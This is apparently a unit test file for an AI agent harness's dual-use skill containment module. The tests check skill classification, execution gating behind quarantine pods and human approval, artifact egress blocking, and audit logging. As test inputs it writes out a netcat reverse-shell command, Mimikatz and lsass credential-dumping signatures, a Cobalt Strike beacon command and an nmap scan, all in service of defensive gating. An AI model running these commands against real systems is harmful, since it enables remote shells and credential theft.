"""Unit tests for DualUseSkillContainmentSuite.

Strict typing applied: No `Any` types allowed.
"""

from __future__ import annotations

from myrm_agent_harness.core.security.dual_use_containment import (
    ArtifactSecurityClassification,
    DualUseSkillContainmentSuite,
    ExecutionGateRequest,
    MitreAttackTactic,
    SkillSensitivityLevel,
)


def test_ttp_tagger_benign_vs_dual_use() -> None:
    """Verify benign and dual-use offensive skills are classified accurately."""
    suite = DualUseSkillContainmentSuite()

    # 1. Benign skill
    spec_benign = suite.evaluate_skill_ttp(
        skill_name="format_markdown_table",
        description="Utility to align markdown table columns.",
    )
    assert spec_benign.sensitivity_level == SkillSensitivityLevel.BENIGN
    assert spec_benign.requires_hitl_approval is False
    assert spec_benign.quarantine_pod_enforced is False
    assert len(spec_benign.tactics) == 0

    # 2. Dual-use offensive credential dumping skill
    spec_dual_use = suite.evaluate_skill_ttp(
        skill_name="mimikatz_memory_dumper",
        description="Automated memory credential extraction tool for penetration testing.",
        command_signatures=["procdump -ma lsass.exe", "sekurlsa::logonpasswords"],
    )
    assert spec_dual_use.sensitivity_level == SkillSensitivityLevel.DUAL_USE_SENSITIVE
    assert spec_dual_use.requires_hitl_approval is True
    assert spec_dual_use.quarantine_pod_enforced is True
    assert MitreAttackTactic.CREDENTIAL_ACCESS in spec_dual_use.tactics


def test_execution_gate_native_host_blocked() -> None:
    """Verify dual-use skill without quarantine pod is blocked on host."""
    suite = DualUseSkillContainmentSuite()
    req = ExecutionGateRequest(
        skill_name="reverse_shell_spawner",
        command_line="nc -e /bin/bash 10.0.0.1 4444",
        target_host_or_ip="10.0.0.1",
        is_running_in_quarantine_pod=False,
    )
    res = suite.check_execution_gate(req)

    assert res.permitted is False
    assert res.enforce_quarantine_pod is True
    assert "strictly prohibited from running on native host" in res.reason


def test_execution_gate_hitl_modal_required() -> None:
    """Verify dual-use skill in quarantine pod requires human confirmation."""
    suite = DualUseSkillContainmentSuite()
    req = ExecutionGateRequest(
        skill_name="c2_beacon_client",
        command_line="cobalt_strike beacon connect",
        target_host_or_ip="192.168.1.50",
        is_running_in_quarantine_pod=True,
        approval_token="",  # No human confirmation yet
    )
    res = suite.check_execution_gate(req)

    assert res.permitted is False
    assert res.requires_hitl_modal is True
    assert "高危攻防指令警示" in res.hitl_prompt_warning


def test_execution_gate_approved_with_token() -> None:
    """Verify dual-use skill executes when running in pod with valid token."""
    suite = DualUseSkillContainmentSuite()
    req = ExecutionGateRequest(
        skill_name="nmap_network_discovery",
        command_line="nmap -sS -p 1-1000 192.168.1.0/24",
        target_host_or_ip="192.168.1.0/24",
        is_running_in_quarantine_pod=True,
        approval_token="hitl_approved_sec_token_999",
    )
    res = suite.check_execution_gate(req)

    assert res.permitted is True
    assert res.requires_hitl_modal is False


def test_artifact_exfiltration_shield_blocks_public_upload() -> None:
    """Verify sensitive screenshots and artifacts are blocked from public upload."""
    suite = DualUseSkillContainmentSuite(allowlisted_destinations=["https://internal.vault.myrm.io/artifacts"])

    # 1. Screenshot upload to public GitHub repo
    screenshot_bytes = b"\x89PNG\r\n\x1a\n" + b"fake screenshot bytes containing employee PII"
    audit_public = suite.evaluate_artifact_egress(
        artifact_id="art_scr_01",
        artifact_name="internal_dashboard_screenshot.png",
        content_bytes=screenshot_bytes,
        target_destination="https://github.com/external-public-org/public-repo/issues/1",
    )
    assert audit_public.is_blocked is True
    assert audit_public.classification == ArtifactSecurityClassification.RESTRICTED_ARTIFACT
    assert "Blocked: Attempted to exfiltrate private artifact" in audit_public.violation_reason

    # 2. Upload to internal allowlisted destination
    audit_internal = suite.evaluate_artifact_egress(
        artifact_id="art_scr_02",
        artifact_name="internal_dashboard_screenshot.png",
        content_bytes=screenshot_bytes,
        target_destination="https://internal.vault.myrm.io/artifacts",
    )
    assert audit_internal.is_blocked is False


def test_flight_recorder_audit_trail() -> None:
    """Verify flight recorder captures tamper-evident audit logs."""
    suite = DualUseSkillContainmentSuite()
    req = ExecutionGateRequest(
        skill_name="benign_calculator",
        command_line="calc 1+1",
        target_host_or_ip="localhost",
    )
    suite.check_execution_gate(req)

    logs = suite.get_flight_recorder_logs(limit=10)
    assert len(logs) >= 1
    assert logs[0].subject == "benign_calculator"
    assert logs[0].decision == "permitted"
